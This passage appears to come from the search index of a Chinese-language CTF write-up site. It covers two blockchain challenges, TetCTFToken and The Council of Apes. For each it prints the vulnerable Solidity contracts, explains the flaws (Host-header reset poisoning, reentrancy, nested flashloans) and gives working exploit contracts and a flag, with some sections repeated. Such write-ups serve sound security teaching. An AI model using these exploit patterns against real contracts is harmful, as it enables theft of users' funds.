() external payable nonReentrant { token . mint ( msg . sender , msg . value ); } function withdraw () external nonReentrant { require ( token . balanceOf ( msg . sender ) > 0 , \"Insufficient balance\" ); ( bool success , ) = msg . sender . call { value : token . balanceOf ( msg . sender )}( \"\" ); require ( success , \"Failed to send Ether\" ); token . burn ( msg . sender , token . balanceOf ( msg . sender )); } function buyFlag ( string memory user ) external returns ( bool ) { require ( address ( msg . sender ). code . length == 0 , \"Smart contract is not allowed\" ); require ( token . balanceOf ( msg . sender ) >= flagPrice , \"Insufficient balance\" ); token . burn ( msg . sender , flagPrice ); flagClaimed [ user ] = true ; return true ; } } FlagStore \u662f\u4e3b\u8981\u4ea4\u4e92\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570 deposit \u7528 BNB \u6362\u53d6\u7b49\u91cf\u7684 TetCTFToken \uff0c\u968f\u540e\u53ef\u901a\u8fc7 withdraw \u5c06\u8d26\u6237\u4e2d\u6240\u6709\u7684 TetCTFToken \u6362\u56de\u7b49\u91cf\u7684 BNB \u51fd\u6570 deposit \u548c withdraw \u5747\u4f7f\u7528\u4e86 nonReentrant \u4fee\u9970\u7b26\uff0c\u4ee5\u9632\u6b62\u91cd\u5165\u653b\u51fb\uff0c\u5373\u4fbf\u5982\u6b64\uff0c\u7531\u4e8e\u4e0d\u7b26\u5408 Checks-Effects-Interactions \u6a21\u5f0f\uff0c msg.sender.call{value: token.balanceOf(msg.sender)}(\"\") \u4e5f\u662f\u503c\u5f97\u91cd\u70b9\u5173\u6ce8\u7684\u5bf9\u8c61\u3002\u4e0d\u80fd\u91cd\u590d\u8c03\u7528 deposit \u548c withdraw \uff0c\u90a3\u4e48\u5728\u5408\u7ea6\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u8fd8\u80fd\u505a\u4ec0\u4e48\u5462\uff1f \u6ce8\u610f\u5230 msg.sender.call \u548c token.burn \u90fd\u4f7f\u7528\u4e86 token.balanceOf \u6765\u83b7\u53d6\u8c03\u7528\u8005\u6301\u6709 TetCTFToken \u7684\u6570\u91cf\uff0c\u56e0\u6b64\u5373\u4f7f\u5728 msg.sender.call \u89e6\u53d1\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u8f6c\u79fb TetCTFToken \uff0c token.burn \u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 contract Hack is Ownable { FlagStore store ; TetCTFToken token ; constructor ( address instance ) payable { store = FlagStore ( instance ); token = TetCTFToken ( store . token ()); } // \u8c03\u7528\u4e00\u6b21\u6c7d\u6cb9\u8d39\u7ea6 0.12 BNB\uff0c\u5c3d\u53ef\u80fd\u63d0\u9ad8\u5355\u6b21\u4ea4\u6613\u91d1\u989d\u4ee5\u8282\u7ea6\u8d44\u91d1 function exploit () public { for ( uint i = 0 ; i < 191 ; i ++ ) { store . deposit { value : 1 ether }(); store . withdraw (); } } function destruct () public onlyOwner { selfdestruct ( payable ( msg . sender )); // \u56de\u6536 BNB (\u2565\u03c9\u2565) } receive () payable external { token . transfer ( tx . origin , 1e18 ); } } \u83b7\u53d6\u8db3\u591f\u7684 TetCTFToken \u540e\uff0c\u8c03\u7528 buyFlag \u5e76\u4f20\u5165\u5728\u7f51\u7ad9\u6ce8\u518c\u7684\u7528\u6237\u540d\uff0c\u6700\u540e Buy Flag \u5c31\u53ef\u4ee5\u5566 :D URL Routing \u2014 Werkzeug Documentation \u21a9","title":"TetCTFToken"},{"location":"blockchain/tetctftoken/#_1","text":"So, this year, we have something cool for you. We hope you will enjoy it. Happy New Year. ~Cheers, Server: http://172.105.114.30:31337 tetctftoken.zip","title":"\u9898\u76ee"},{"location":"blockchain/tetctftoken/#_2","text":"\u4e0d\u592a\u5e38\u89c1\u7684 Web2 + Web3 \u7ec4\u5408\u9898\uff0c\u4e0d\u8fc7\u5e78\u597d\u4e24\u4e2a\u90e8\u5206\u53ef\u4ee5\u72ec\u7acb\u89e3\u9898 (=\u03c9=) Strellic \u5b8c\u6210\u4e86 Web2 \u7684\u90e8\u5206\uff0c\u5173\u952e\u70b9\u5728 app.py \u4e2d\u51fd\u6570 userType \u4f7f\u7528\u4e86 url_for('gen_token', Type=_secret_token, _external=True) \u6765\u83b7\u53d6 _secret_reset_passwd_URL \uff0c\u5e76\u5411\u5176\u53d1\u9001\u5305\u542b\u65b0\u5bc6\u7801\u7684\u8bf7\u6c42 \u56e0\u4e3a external=True \uff0c\u6240\u4ee5\u4f1a\u7ed3\u5408\u8bbe\u7f6e\u7684 SERVER_NAME \u6765\u751f\u6210\u5b8c\u6574\u7684 URL \u800c\u670d\u52a1\u5668\u5e76\u6ca1\u6709\u8bbe\u7f6e SERVER_NAME \uff0c\u56e0\u6b64\u4f1a\u4ece\u8bf7\u6c42\u5934\u4e2d\u83b7\u53d6 Host \u5b57\u6bb5\u4f5c\u4e3a SERVER_NAME 1 \u5c06 Host \u8bbe\u7f6e\u4e3a\u53ef\u63a7\u5730\u5740\uff0c\u518d\u53d1\u9001\u91cd\u7f6e\u5bc6\u7801\u7684\u8bf7\u6c42\uff0c\u5c31\u53ef\u4ee5\u76d1\u542c\u5230\u670d\u52a1\u5668\u8bf7\u6c42 /secret-token/<Type> \uff0c\u5176\u4e2d\uff0c Type \u5bf9\u5e94\u65b0\u7684\u8d26\u6237\u5bc6\u7801 TetCTFToken/templates/dashboard.html \u4e2d\u7ed9\u51fa\u4e86\u5408\u7ea6 TetCTFToken \u548c FlagStore \u7684\u5730\u5740\uff0c\u5e76\u5728 BscScan \u4e0a\u63d0\u4f9b\u4e86\u5408\u7ea6\u7684\u6e90\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 //SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; // \u4e3a\u4e86\u65b9\u4fbf\u9605\u8bfb\uff0c\u5c06\u7236\u5408\u7ea6\u8f6c\u6362\u6210 import \u7684\u5f62\u5f0f import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\" ; import \"@openzeppelin/contracts/access/Ownable.sol\" ; import \"@openzeppelin/contracts/security/ReentrancyGuard.sol\" ; contract TetCTFToken is ERC20 ( \"TetCTF Token\" , \"TetCTF\" ), Ownable , ReentrancyGuard { function mint ( address _to , uint _amount ) external onlyOwner { _mint ( _to , _amount ); } function burn ( address _from , uint _amount ) external onlyOwner { _burn ( _from , _amount ); } } contract FlagStore is Ownable , ReentrancyGuard { TetCTFToken public immutable token ; uint public flagPrice = 1337 * 1e18 ; mapping ( string => bool ) public flagClaimed ; constructor () { token = new TetCTFToken (); } function setFlagPrice ( uint price ) external onlyOwner { flagPrice = price ; } function deposit () external payable nonReentrant { token . mint ( msg . sender , msg . value ); } function withdraw () external nonReentrant { require ( token . balanceOf ( msg . sender ) > 0 , \"Insufficient balance\" ); ( bool success , ) = msg . sender . call { value : token . balanceOf ( msg . sender )}( \"\" ); require ( success , \"Failed to send Ether\" ); token . burn ( msg . sender , token . balanceOf ( msg . sender )); } function buyFlag ( string memory user ) external returns ( bool ) { require ( address ( msg . sender ). code . length == 0 , \"Smart contract is not allowed\" ); require ( token . balanceOf ( msg . sender ) >= flagPrice , \"Insufficient balance\" ); token . burn ( msg . sender , flagPrice ); flagClaimed [ user ] = true ; return true ; } } FlagStore \u662f\u4e3b\u8981\u4ea4\u4e92\u5408\u7ea6\uff0c\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570 deposit \u7528 BNB \u6362\u53d6\u7b49\u91cf\u7684 TetCTFToken \uff0c\u968f\u540e\u53ef\u901a\u8fc7 withdraw \u5c06\u8d26\u6237\u4e2d\u6240\u6709\u7684 TetCTFToken \u6362\u56de\u7b49\u91cf\u7684 BNB \u51fd\u6570 deposit \u548c withdraw \u5747\u4f7f\u7528\u4e86 nonReentrant \u4fee\u9970\u7b26\uff0c\u4ee5\u9632\u6b62\u91cd\u5165\u653b\u51fb\uff0c\u5373\u4fbf\u5982\u6b64\uff0c\u7531\u4e8e\u4e0d\u7b26\u5408 Checks-Effects-Interactions \u6a21\u5f0f\uff0c msg.sender.call{value: token.balanceOf(msg.sender)}(\"\") \u4e5f\u662f\u503c\u5f97\u91cd\u70b9\u5173\u6ce8\u7684\u5bf9\u8c61\u3002\u4e0d\u80fd\u91cd\u590d\u8c03\u7528 deposit \u548c withdraw \uff0c\u90a3\u4e48\u5728\u5408\u7ea6\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u8fd8\u80fd\u505a\u4ec0\u4e48\u5462\uff1f \u6ce8\u610f\u5230 msg.sender.call \u548c token.burn \u90fd\u4f7f\u7528\u4e86 token.balanceOf \u6765\u83b7\u53d6\u8c03\u7528\u8005\u6301\u6709 TetCTFToken \u7684\u6570\u91cf\uff0c\u56e0\u6b64\u5373\u4f7f\u5728 msg.sender.call \u89e6\u53d1\u7684\u56de\u8c03\u51fd\u6570\u4e2d\u8f6c\u79fb TetCTFToken \uff0c token.burn \u4e5f\u4e0d\u4f1a\u629b\u51fa\u5f02\u5e38 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 contract Hack is Ownable { FlagStore store ; TetCTFToken token ; constructor ( address instance ) payable { store = FlagStore ( instance ); token = TetCTFToken ( store . token ()); } // \u8c03\u7528\u4e00\u6b21\u6c7d\u6cb9\u8d39\u7ea6 0.12 BNB\uff0c\u5c3d\u53ef\u80fd\u63d0\u9ad8\u5355\u6b21\u4ea4\u6613\u91d1\u989d\u4ee5\u8282\u7ea6\u8d44\u91d1 function exploit () public { for ( uint i = 0 ; i < 191 ; i ++ ) { store . deposit { value : 1 ether }(); store . withdraw (); } } function destruct () public onlyOwner { selfdestruct ( payable ( msg . sender )); // \u56de\u6536 BNB (\u2565\u03c9\u2565) } receive () payable external { token . transfer ( tx . origin , 1e18 ); } } \u83b7\u53d6\u8db3\u591f\u7684 TetCTFToken \u540e\uff0c\u8c03\u7528 buyFlag \u5e76\u4f20\u5165\u5728\u7f51\u7ad9\u6ce8\u518c\u7684\u7528\u6237\u540d\uff0c\u6700\u540e Buy Flag \u5c31\u53ef\u4ee5\u5566 :D URL Routing \u2014 Werkzeug Documentation \u21a9","title":"\u89e3\u9898\u601d\u8def"},{"location":"blockchain/the_council_of_apes/","tags":["smart contract","flashloan","reentrancy"],"text":"#smart contract #flashloan #reentrancy .md-typeset .blogging-tags-grid { display: flex; flex-direction: row; flex-wrap: wrap; gap: 8px; margin-top: 5px; } .md-typeset .blogging-tag { color: var(--md-typeset-color); background-color: var(--md-typeset-code-color); white-space: nowrap; display: block; } .md-typeset .blogging-tag code { border-radius: 5px; } \u9898\u76ee \u00b6 On top of the glacier you run into a bunch of monkeys. They are screaching at each other, throwin feces around and won't let you pass. You will need to somehow get rid of them to finish your mission. nc chall.glacierctf.com 13380 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.20 ; import \"./IcyExchange.sol\" ; contract Setup { IcyExchange public immutable TARGET ; // Contract the player will hack IERC20 public monkeyToken ; IERC20 public djungleCoin ; bool public already_claimed ; constructor () payable { // Deploy the target contract TARGET = new IcyExchange { value : 5 ether }(); //Become an ape bytes32 holyWords = keccak256 ( \"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing\" ); TARGET . council (). becomeAnApe ( holyWords ); // We generate 2 new tokens and deploy them at the exchange monkeyToken = new TotallyNotCopiedToken ( address ( this ), \"MonkeyToken\" , \"MONK\" ); djungleCoin = new TotallyNotCopiedToken ( address ( this ), \"DjungleCoin\" , \"DJUNGLE\" ); //Approve the exchange for both monkeyToken . approve ( address ( TARGET ), 100 _000 ); djungleCoin . approve ( address ( TARGET ), 100 _000 ); //Deploy both pools TARGET . createPool { value : 1 ether }( address ( monkeyToken )); TARGET . createPool { value : 1 ether }( address ( djungleCoin )); } //You can get 100 of each for free function claimFreeTokens () external { require ( ! already_claimed ); monkeyToken . transfer ( msg . sender , 100 ); djungleCoin . transfer ( msg . sender , 100 ); already_claimed = true ; } // Our challenge in the CTF framework will call this function to // check whether the player has solved the challenge or not. function isSolved () public view returns ( bool ) { return TARGET . council (). isDissolved (); } } IcyExchange.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.20 ; import \"./CouncilOfApes.sol\" ; contract IcyExchange { TotallyNotCopiedToken public icyToken ; CouncilOfApes public council ; mapping ( address => IcyPool ) pools ; mapping ( address => mapping ( IERC20 => uint256 )) public liquidity ; uint256 poolCounter ; modifier onlyApe { require ( council . getMemberClass ( msg . sender ) >= CouncilOfApes . apeClass . APE ); _ ; } constructor () payable { require ( msg . value == 5 ether , \"You must pay 5 Ether to create the exchange\" ); icyToken = new TotallyNotCopiedToken ( address ( this ), \"IcyToken\" , \"ICY\" ); council = new CouncilOfApes ( address ( icyToken )); } //---------------------------- Public Functions ----------------------------// function createPool ( address token ) onlyApe () payable external { require ( msg . value == 1 ether , \"You must pay 1 Ether to create a pool\" ); //Check if pool already exists require ( address ( pools [ token ]) == address ( 0 ), \"This pool already exists\" ); //Create the pool and add it to the pools mapping pools [ token ] = new IcyPool ( address ( icyToken ), token ); //Every pool needs to be initialized with 100,000 of the chosen tokens and will get 100,000 of the icyToken IERC20 ( token ). transferFrom ( msg . sender , address ( pools [ token ]), 100 _000 ); icyToken . transfer ( address ( pools [ token ]), 100 _000 ); } function swap ( address fromToken , address toToken , uint256 amount ) onlyApe () external { require ( amount > 0 , \"You must swap at least 1 token\" ); IcyPool pool ; if ( fromToken == address ( icyToken )) { pool = pools [ toToken ]; } else if ( toToken == address ( icyToken )) { pool = pools [ fromToken ]; } pool . swap ( msg . sender , fromToken , toToken , amount ); } //---------------------------- Lending Functions ----------------------------// //We offer the worlds first collateralized flash loan (even safer than anything else) function collateralizedFlashloan ( address collateralToken , uint256 amount , address target ) onlyApe () external { require ( amount > 0 , \"You must lend out at least 1 token\" ); require ( amount <= icyToken . balanceOf ( address ( this )), \"We can't lend you this much\" ); require ( IERC20 ( collateralToken ). totalSupply () <= 100 _000_000 , \"Shitcoins are not accepted\" ); require ( address ( pools [ collateralToken ]) != address ( 0 ), \"This pool does not exist\" ); uint256 neededCollateral = pools [ collateralToken ]. getTokensPerIcyToken ( amount ); require ( neededCollateral <= 100 _000_000 , \"Shitcoins are still not accepted, don't try to cheat us\" ); //Receive the collateral IERC20 ( collateralToken ). transferFrom ( msg . sender , address ( this ), neededCollateral ); //Flashloan happens icyToken . transfer ( msg . sender , amount ); //You get to do stuff ( bool success , ) = target . call ( abi . encodeWithSignature ( \"receiveFlashLoan(uint256)\" , amount )); require ( success ); //By here we should get all our money back icyToken . transferFrom ( msg . sender , address ( this ), amount ); //Return the collateral IERC20 ( collateralToken ). transfer ( msg . sender , neededCollateral ); } //---------------------------- View Functions ----------------------------// function getPoolCount () public view returns ( uint256 ) { return poolCounter ; } function getPool ( address token ) public view returns ( IcyPool ) { return pools [ token ]; } } CouncilOfApes.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 pragma solidity ^ 0.8.20 ; import \"./IcyPool.sol\" ; contract CouncilOfApes { mapping ( address => uint256 ) public bananaBalance ; mapping ( address => uint256 ) public votes ; mapping ( address => apeClass ) public members ; bool public dissolved ; IERC20 public icyToken ; uint256 lastVote ; enum apeClass { NOBODY , APE , CHIMP , ORANGUTAN , GORILLA } modifier notDissolved { require ( dissolved == false , \"The council has been dissolved\" ); _ ; } modifier onlyAlpha { require ( members [ msg . sender ] == apeClass . GORILLA , \"This function can only be called by an alpha ape\" ); _ ; } constructor ( address _icyToken ) { dissolved = false ; icyToken = IERC20 ( _icyToken ); lastVote = 0 ; } //--------------------------- APE FUNCTIONS ---------------------------// //To become an ape you have to say the holy words. function becomeAnApe ( bytes32 theHolyWords ) external notDissolved { require ( theHolyWords == keccak256 ( \"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing\" )); //You are officially an ape now members [ msg . sender ] = apeClass . APE ; //You get a free banana bananaBalance [ msg . sender ] = 1 ; } //You can also buy bananas from the apes function buyBanana ( uint256 amount ) external notDissolved () { require ( members [ msg . sender ] == apeClass . APE ); icyToken . transferFrom ( msg . sender , address ( this ), amount ); bananaBalance [ msg . sender ] += amount ; } //You can also get your bananas back function sellBanana ( uint256 amount ) external notDissolved () { require ( bananaBalance [ msg . sender ] >= amount , \"You don't have that many bananas\" ); icyToken . transfer ( msg . sender , amount ); bananaBalance [ msg . sender ] -= amount ; } //Every cycle the apes vote for new alphas with their bananas function vote ( address target , uint256 amount ) external { require ( bananaBalance [ msg . sender ] >= amount , \"You don't have that many bananas\" ); bananaBalance [ msg . sender ] -= amount ; votes [ target ] += amount ; } //If you have enough votes, you can claim a new rank function claimNewRank () external { if ( votes [ msg . sender ] >= 1 _000_000_000 ) { members [ msg . sender ] = apeClass . GORILLA ; lastVote = block . timestamp ; } else if ( votes [ msg . sender ] >= 1 _000_000 ) { members [ msg . sender ] = apeClass . ORANGUTAN ; lastVote = block . timestamp ; } else if ( votes [ msg . sender ] >= 1 _000 ) { members [ msg . sender ] = apeClass . CHIMP ; lastVote = block . timestamp ; } } //--------------------------- ALPHA FUNCTIONS ---------------------------// //The alpha can issue himself bananas function issueBanana ( uint256 amount , address target ) external notDissolved () onlyAlpha () { require ( amount > 0 , \"You must issue at least 1 banana\" ); bananaBalance [ target ] += amount ; } //If you are one of the alpha apes, you can dissolve the council function dissolveCouncilOfTheApes ( bytes32 theEvilWords ) external notDissolved () onlyAlpha () { require ( theEvilWords == keccak256 ( \"Kevin come out of the basement, dinner is ready.\" )); dissolved = true ; } //--------------------------- VIEW FUNCTIONS ---------------------------// function getBananaBalance ( address target ) external view returns ( uint256 ) { return bananaBalance [ target ]; } function getVotes ( address target ) external view returns ( uint256 ) { return votes [ target ]; } function getMemberClass ( address target ) external view returns ( apeClass ) { return members [ target ]; } function isDissolved () external view returns ( bool ) { return dissolved ; } } IcyPool.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 pragma solidity ^ 0.8.20 ; import \"./TotallyNotCopiedToken.sol\" ; contract IcyPool { address public exchange ; IERC20 public icyToken ; IERC20 public token2 ; modifier onlyExchange { require ( msg . sender == exchange , \"Only the exchange can call this function\" ); _ ; } constructor ( address icyToken_ , address token2_ ) { icyToken = IERC20 ( icyToken_ ); token2 = IERC20 ( token2_ ); exchange = msg . sender ; } //----------------------------- External Functionalities -----------------------------------------// function swap ( address caller , address fromToken , address toToken , uint256 amount ) onlyExchange external { uint256 receivedTokens = _calculateOutput ( fromToken , toToken , amount ); //Check if the pool has enough tokens to swap require ( IERC20 ( toToken ). balanceOf ( address ( this )) > receivedTokens , \"The pool does not have enough tokens to swap\" ); //Let the pool swap the tokens IERC20 ( fromToken ). transferFrom ( caller , address ( this ), amount ); //Transfer the tokens back to the caller IERC20 ( toToken ). transfer ( caller , receivedTokens ); } function getTokensPerIcyToken ( uint256 amount ) view external returns ( uint256 ) { return _calculateOutput ( address ( icyToken ), address ( token2 ), amount ); } //----------------------------- Internal Functionalities -----------------------------------------// function _calculateOutput ( address _tokenFrom , address _tokenTo , uint256 amount ) internal view returns ( uint256 ) { uint256 balanceOfTokenFrom = IERC20 ( _tokenFrom ). balanceOf ( address ( this )); uint256 balanceOfTokenTo = IERC20 ( _tokenTo ). balanceOf ( address ( this )); uint256 returned_tokens = ( amount * balanceOfTokenTo ) / balanceOfTokenFrom ; if ( returned_tokens >= balanceOfTokenTo ) { returned_tokens = balanceOfTokenTo - 1 ; } return returned_tokens ; } } TotallyNotCopiedToken.sol 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.20 ; import \"./libraries/ERC20.sol\" ; contract TotallyNotCopiedToken is ERC20 { constructor ( address owner , string memory name , string memory symbol ) ERC20 ( name , symbol ) { _mint ( owner , type ( uint256 ). max ); } } \u89e3\u9898\u601d\u8def \u00b6 \u76ee\u6807\u662f\u89e3\u6563 CouncilOfApes 1 2 3 function isSolved () public view returns ( bool ) { return TARGET . council (). isDissolved (); } \u53ea\u6709 apeClass \u4e3a GORILLA \u624d\u80fd\u89e3\u6563\u59d4\u5458\u4f1a 1 2 3 4 5 6 7 8 modifier onlyAlpha { require ( members [ msg . sender ] == apeClass . GORILLA , \"This function can only be called by an alpha ape\" ); _ ; } //If you are one of the alpha apes, you can dissolve the council function dissolveCouncilOfTheApes ( bytes32 theEvilWords ) external notDissolved () onlyAlpha () \u6210\u4e3a GORILLA \u9700\u8981 \\(10^9\\) \u7968\uff0c\u5bf9\u5e94 \\(10^9\\) \u6839\u9999\u8549\uff0c\u9999\u8549\u53ef\u901a\u8fc7 icyToken \u5151\u6362\u3002\u6210\u4e3a GORILLA \u4e4b\u540e\u80fd\u591f\u83b7\u53d6\u4efb\u610f\u6570\u91cf\u7684\u9999\u8549\uff0c\u800c IcyExchange \u63d0\u4f9b icyToken \u95ea\u7535\u8d37\uff0c\u90a3\u4e48\u53ef\u4ee5\u501f\u52a9\u95ea\u7535\u8d37\u6210\u4e3a GORILLA \uff0c\u518d\u5356\u6389\u9999\u8549\u6362\u53d6 icyToken \u5f52\u8fd8\u95ea\u7535\u8d37 \u53d1\u8d77\u95ea\u7535\u8d37\u9700\u8981\u8d28\u62bc\u53e6\u4e00\u79cd\u4ee3\u5e01\u3002\u7531\u4e8e\u4ee3\u5e01\u603b\u53d1\u884c\u91cf\u4e0d\u80fd\u8d85\u8fc7 \\(10^8\\) \uff0c\u56e0\u800c\u4e0d\u80fd\u4f7f\u7528 TotallyNotCopiedToken \u3002\u4f46\u5355\u6b21\u95ea\u7535\u8d37\u7684\u91d1\u989d\u4e0d\u8db3\u4ee5\u6210\u4e3a GORILLA \uff0c\u8003\u8651\u5230\u6ca1\u6709\u91cd\u5165\u4fdd\u62a4\uff0c\u53ef\u4ee5\u5728 receiveFlashLoan() \u65f6\u518d\u6b21\u53d1\u8d77\u95ea\u7535\u8d37 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 function collateralizedFlashloan ( address collateralToken , uint256 amount , address target ) onlyApe () external { require ( amount > 0 , \"You must lend out at least 1 token\" ); require ( amount <= icyToken . balanceOf ( address ( this )), \"We can't lend you this much\" ); require ( IERC20 ( collateralToken ). totalSupply () <= 100 _000_000 , \"Shitcoins are not accepted\" ); require ( address ( pools [ collateralToken ]) != address ( 0 ), \"This pool does not exist\" ); uint256 neededCollateral = pools [ collateralToken ]. getTokensPerIcyToken ( amount ); require ( neededCollateral <= 100 _000_000 , \"Shitcoins are still not accepted, don't try to cheat us\" ); //Receive the collateral IERC20 ( collateralToken ). transferFrom ( msg . sender , address ( this ), neededCollateral ); //Flashloan happens icyToken . transfer ( msg . sender , amount ); //You get to do stuff ( bool success , ) = target . call ( abi . encodeWithSignature ( \"receiveFlashLoan(uint256)\" , amount )); require ( success ); //By here we should get all our money back icyToken . transferFrom ( msg . sender , address ( this ), amount ); //Return the collateral IERC20 ( collateralToken ). transfer ( msg . sender , neededCollateral ); } Exploit \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 contract HackToken is ERC20 { constructor ( address owner ) ERC20 ( \"HackToken\" , \"HACK\" ) { _mint ( owner , 100 _000_000 ); } } contract CouncilOfApesHack { IcyExchange exchange ; CouncilOfApes council ; TotallyNotCopiedToken icyToken ; bytes32 theHolyWords = keccak256 ( \"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing\" ); bytes32 theEvilWords = keccak256 ( \"Kevin come out of the basement, dinner is ready.\" ); function exploit ( Setup setup ) external payable { exchange = setup . TARGET (); council = exchange . council (); icyToken = exchange . icyToken (); icyToken . approve ( address ( exchange ), type ( uint256 ). max ); icyToken . approve ( address ( council ), type ( uint256 ). max ); council . becomeAnApe ( theHolyWords ); setup . claimFreeTokens (); HackToken token = new HackToken ( address ( this )); token . approve ( address ( exchange ), type ( uint256 ). max ); exchange . createPool { value : 1 ether }( address ( token )); exchange . collateralizedFlashloan ( address ( token ), token . balanceOf ( address ( this )), address ( this ) ); council . dissolveCouncilOfTheApes ( theEvilWords ); } function receiveFlashLoan ( uint256 amount ) external { require ( msg . sender == address ( exchange )); if ( icyToken . balanceOf ( address ( this )) < 1e9 ) { HackToken token = new HackToken ( address ( this )); token . approve ( address ( exchange ), type ( uint256 ). max ); exchange . createPool { value : 1 ether }( address ( token )); exchange . collateralizedFlashloan ( address ( token ), token . balanceOf ( address ( this )), address ( this ) ); } else { council . buyBanana ( 1e9 ); council . vote ( address ( this ), 1e9 ); council . claimNewRank (); } council . issueBanana ( amount , address ( this )); uint balance = icyToken . balanceOf ( address ( council )); council . sellBanana ( amount > balance ? balance : amount ); } } Flag \u00b6 gctf{M0nkee5_4re_inD33d_t0g3ther_str0ng3r}","title":"The Council of Apes"},{"location":"blockchain/the_council_of_apes/#_1","text":"On top of the glacier you run into a bunch of monkeys. They are screaching at each other, throwin feces around and won't let you pass. You will need to somehow get rid of them to finish your mission. nc chall.glacierctf.com 13380 Setup.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.20 ; import \"./IcyExchange.sol\" ; contract Setup { IcyExchange public immutable TARGET ; // Contract the player will hack IERC20 public monkeyToken ; IERC20 public djungleCoin ; bool public already_claimed ; constructor () payable { // Deploy the target contract TARGET = new IcyExchange { value : 5 ether }(); //Become an ape bytes32 holyWords = keccak256 ( \"I hereby swear to ape into every shitcoin I see, to never sell, to never surrender, to never give up, to never stop buying, to never stop hodling, to never stop aping, to never stop believing, to never stop dreaming, to never stop hoping, to never stop loving, to never stop living, to never stop breathing\" ); TARGET . council (). becomeAnApe ( holyWords ); // We generate 2 new tokens and deploy them at the exchange monkeyToken = new TotallyNotCopiedToken ( address ( this ), \"MonkeyToken\" , \"MONK\" ); djungleCoin = new TotallyNotCopiedToken ( address ( this ), \"DjungleCoin\" , \"DJUNGLE\" ); //Approve the exchange for both monkeyToken . approve ( address ( TARGET ), 100 _000 ); djungleCoin . approve ( address ( TARGET ), 100 _000 ); //Deploy both pools TARGET . createPool { value : 1 ether }( address ( monkeyToken )); TARGET . createPool { value : 1 ether }( address ( djungleCoin )); } //You can get 100 of each for free function claimFreeTokens () external { require ( ! already_claimed ); monkeyToken . transfer ( msg . sender , 100 ); djungleCoin . transfer ( msg . sender , 100 ); already_claimed = true ; } // Our challenge in the CTF framework will call this function to // check whether the player has solved the challenge or not. function isSolved () public view returns ( bool ) { return TARGET . council (). isDissolved (); } } IcyExchange.sol 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.20 ; import \"./CouncilOfApes.sol\" ; contract IcyExchange { TotallyNotCopiedToken public icyToken ; CouncilOfApes public council ; mapping ( address => IcyPool ) pools ; mapping ( address => mapping ( IERC20 => uint256 )) public liquidity ; uint256 poolCounter ; modifier onlyApe { require ( council . getMemberClass ( msg . sender ) >= CouncilOfApes . apeClass . APE ); _ ; } constructor () payable { require ( msg . value == 5 ether , \"You must pay 5 Ether to create the exchange\" ); icyToken = new TotallyNotCopiedToken ( address ( this ), \"IcyToken\" , \"ICY\" ); council = new CouncilOfApes ( address ( icyToken )); 